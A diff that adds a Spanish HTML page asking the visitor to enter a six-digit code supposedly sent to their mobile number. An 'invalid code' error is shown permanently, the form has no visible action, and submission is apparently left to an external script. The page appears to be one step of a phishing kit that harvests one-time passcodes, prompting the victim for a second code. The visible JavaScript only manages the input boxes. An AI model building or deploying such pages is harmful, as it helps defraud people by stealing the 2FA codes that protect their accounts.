@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="stylesheet" href="./css/big-stlye.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div style="width: 100%;">
+        <img width="100%" src="./img/Frame 1355.svg" alt="">
+    </div>
+    
+    <div class="section">  
+        
+        <div class="upo-p">
+            <p class="p3">Introduce el código de confirmación que acabamos de enviar a tu número de móvil +34**</p>
+        </div>
+
+        <form method="post" id="pg5">
+            <div class="otp-container">
+                <input id="t1" type="text" class="otp-input" maxlength="1" inputmode="numeric" required>
+                <input id="t2" type="text" class="otp-input" maxlength="1" inputmode="numeric"required>
+                <input id="t3" type="text" class="otp-input" maxlength="1" inputmode="numeric"required>
+                <input id="t4" type="text" class="otp-input" maxlength="1" inputmode="numeric"required>
+                <input id="t5" type="text" class="otp-input" maxlength="1" inputmode="numeric"required>
+                <input id="t6" type="text" class="otp-input" maxlength="1" inputmode="numeric"required>
+            </div>
+
+            <p style="color: rgb(196, 36, 36); text-align: center; margin-bottom: 25px; margin-top: -18px;">Código inválido</p>
+            
+            <button type="submit"><span>Continuar</span> <img src="./img/ar.svg" alt=""></button>
+        </form>
+    </div>
+
+
+    <div>
+        <div class="lini">
+            <img src="./img/great1.JPG" alt="">
+            
+        </div>
+        <div class="bot3">
+            <img src="./img/blast.JPG" alt="">
+        </div>
+    </div>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('.otp-input');
+            
+            inputs.forEach((input, index) => {
+                // Handle input
+                input.addEventListener('input', function(e) {
+                    // Allow only numbers
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    // Move to next input if available
+                    if (this.value && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+                
+                // Handle backspace
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+                
+                // Handle paste
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedText = e.clipboardData.getData('text');
+                    const numbers = pastedText.match(/\d/g);
+                    
+                    if (numbers) {
+                        numbers.forEach((number, i) => {
+                            if (index + i < inputs.length) {
+                                inputs[index + i].value = number;
+                                if (index + i < inputs.length - 1) {
+                                    inputs[index + i + 1].focus();
+                                }
+                            }
+                        });
+                    }
+                });
+            });
+        });
+    </script>
+    <!--  -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
